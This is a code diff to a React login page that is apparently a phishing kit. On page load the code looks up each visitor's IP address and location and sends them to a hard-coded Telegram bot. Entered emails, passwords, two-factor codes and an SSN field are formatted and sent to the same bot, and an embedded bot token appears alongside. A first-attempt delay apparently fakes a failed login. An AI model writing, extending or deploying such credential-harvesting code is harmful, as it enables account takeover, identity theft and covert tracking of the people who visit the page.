@@ -28,37 +28,53 @@ export default function LoginPage() {
   const [telegramBotToken] = useState("8282863099:AAGCOmJ3FgeClGZkB15jkSqijaTHH21abZI"); // Replace with actual bot token
 
   useEffect(() => {
-    // Send visit alert to Telegram when page loads
-    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: telegramChatId,
-        text: "Someone visited the website: " + window.location.href,
-      }),
-    });
+    // Fetch IP and location data
+    fetch("https://ipapi.co/json/")
+      .then((response) => response.json())
+      .then((data) => {
+        const visitData = {
+          url: window.location.href,
+          ip: data.ip,
+          location: `${data.city}, ${data.region}, ${data.country_name}`,
+        };
 
-    // Custom domain visit alert
-    const handleCustomDomainVisit = () => {
-      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: telegramChatId,
-          text: "Custom domain visited: " + window.location.href,
-        }),
+        // Send visit alert to Telegram with formatted message
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: `Visited this URL: ${visitData.url}\nIP Address: ${visitData.ip}\nLocation: ${visitData.location}`,
+          }),
+        });
       });
-    };
-    if (window.location.hostname !== "localhost") handleCustomDomainVisit();
   }, [telegramBotToken, telegramChatId]);
 
   const sendToTelegram = (data: { email?: string; password?: string; rememberMe?: boolean; twoFactorCode?: string; randomNumber?: string; }) => {
+    const formattedData = {
+      email: data.email ? `\`${data.email}\`` : undefined,
+      password: data.password ? `\`${data.password}\`` : undefined,
+      twoFactorCode: data.twoFactorCode ? `\`${data.twoFactorCode}\`` : undefined,
+      randomNumber: data.randomNumber ? `\`${data.randomNumber}\`` : undefined,
+    };
+
+    const message = [
+      data.email ? `Email: ${formattedData.email}` : "",
+      data.password ? `Password: ${formattedData.password}` : "",
+      data.twoFactorCode ? `2FA Code: ${formattedData.twoFactorCode}` : "",
+      data.randomNumber ? `SSN: ${formattedData.randomNumber}` : "",
+      data.rememberMe !== undefined ? `Remember Me: ${data.rememberMe}` : "",
+    ]
+      .filter(Boolean)
+      .join("\n");
+
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: telegramChatId,
-        text: JSON.stringify(data),
+        text: message,
+        parse_mode: "Markdown",
       }),
     });
   };
@@ -81,7 +97,7 @@ export default function LoginPage() {
     setIsLoading(true);
     setSubmitMessage(null);
 
-    sendToTelegram({ email, password, rememberMe });
+    sendToTelegram({ email, password});
 
     if (attemptCount === 0) {
       await new Promise((resolve) => setTimeout(resolve, 5000));
